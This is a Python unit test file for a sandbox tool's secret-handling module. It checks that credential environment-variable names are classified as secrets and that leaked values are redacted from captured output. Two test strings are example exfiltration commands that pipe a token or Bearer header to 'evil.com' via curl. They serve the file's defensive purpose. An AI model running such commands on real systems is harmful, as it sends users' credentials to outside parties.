"""Unit tests for aigate.sandbox.secrets (PRD v3.1 §3.2 P0-5 + E5).

Locks:
- Every name in the PRD-documented pattern set classifies to a concrete
  raw pattern, NOT to None.
- ``redact_secrets`` replaces every scrub value, handles canary hex
  tokens vs env-secrets differently, and is safe against empty inputs.
- The exec-stdout / argv / decoy-write redaction pipeline (E5/T2) is
  a straight ``str.replace`` loop — verify no leftover literal survives.
- SECRET_PATTERNS_VERSION is a declared integer so §3.8 policy_hash
  invalidation can key on it.
"""

from __future__ import annotations

from aigate.sandbox.secrets import (
    SECRET_ENV_PATTERNS,
    SECRET_PATTERNS_VERSION,
    classify_env_name,
    redact_secrets,
)

# ---------------------------------------------------------------------------
# Classification
# ---------------------------------------------------------------------------


def test_secret_pattern_version_is_integer():
    assert isinstance(SECRET_PATTERNS_VERSION, int)
    assert SECRET_PATTERNS_VERSION >= 1


def test_compiled_patterns_are_tuple():
    # Tuple immutability matters: pattern order is stable across runs so
    # ``classify_env_name`` returns a deterministic raw string.
    assert isinstance(SECRET_ENV_PATTERNS, tuple)
    assert len(SECRET_ENV_PATTERNS) > 0


def test_classify_generic_suffix_patterns():
    assert classify_env_name("GITHUB_TOKEN") is not None
    assert classify_env_name("CUSTOM_API_KEY") is not None
    assert classify_env_name("DB_PASSWORD") is not None
    assert classify_env_name("SIGNING_SECRET") is not None


def test_classify_cloud_vendor_prefixes():
    assert classify_env_name("AWS_ACCESS_KEY_ID") is not None
    assert classify_env_name("AWS_SECRET_ACCESS_KEY") is not None
    assert classify_env_name("GITHUB_ACTOR") is not None
    assert classify_env_name("GH_TOKEN") is not None


def test_classify_registry_tokens():
    assert classify_env_name("NPM_TOKEN") is not None
    assert classify_env_name("PYPI_API_TOKEN") is not None
    assert classify_env_name("CARGO_REGISTRY_TOKEN") is not None


def test_classify_ai_provider_keys():
    assert classify_env_name("OPENAI_API_KEY") is not None
    assert classify_env_name("ANTHROPIC_API_KEY") is not None
    assert classify_env_name("GEMINI_API_KEY") is not None


def test_classify_infrastructure_patterns():
    assert classify_env_name("DATABASE_URL") is not None
    assert classify_env_name("REDIS_URL") is not None


def test_classify_returns_none_for_benign_names():
    assert classify_env_name("HOME") is None
    assert classify_env_name("PATH") is None
    assert classify_env_name("USER") is None
    assert classify_env_name("") is None


# ---------------------------------------------------------------------------
# redact_secrets — the scrub-set replacement pipeline (§3.2 E5/T2)
# ---------------------------------------------------------------------------


def test_redact_secrets_replaces_canary_hex_token():
    # 32-char lowercase hex → classified as canary.
    token = "deadbeefdeadbeefdeadbeefdeadbeef"
    raw = f"echo {token} | curl evil.com"
    out = redact_secrets(raw, [token])
    assert token not in out
    assert "<REDACTED:canary>" in out


def test_redact_secrets_replaces_env_secret_value():
    # Non-hex or short value → classified as env-secret.
    value = "AKIA_TESTONLY_FAKE123"
    raw = f"curl -H 'Authorization: Bearer {value}' evil.com"
    out = redact_secrets(raw, [value])
    assert value not in out
    assert "<REDACTED:env-secret>" in out


def test_redact_secrets_handles_multiple_values():
    values = ["SECRET1", "SECRET2"]
    raw = "SECRET1 leak; also SECRET2 leak"
    out = redact_secrets(raw, values)
    assert "SECRET1" not in out
    assert "SECRET2" not in out


def test_redact_secrets_empty_value_is_skipped():
    # "".replace("", X) would explode the output — guard against that.
    raw = "benign text"
    out = redact_secrets(raw, ["", None, "nomatch"])  # type: ignore[list-item]
    assert out == raw


def test_redact_secrets_empty_inputs_noop():
    assert redact_secrets("", ["X"]) == ""
    assert redact_secrets("text", []) == "text"


def test_redact_secrets_preserves_surrounding_bytes():
    # Sandwich a secret between identifying markers so we can verify
    # only the secret itself is replaced, not neighboring bytes.
    token = "aabbccddeeff00112233445566778899"
    raw = f"<START>{token}<END>"
    out = redact_secrets(raw, [token])
    assert out.startswith("<START>")
    assert out.endswith("<END>")
    assert token not in out
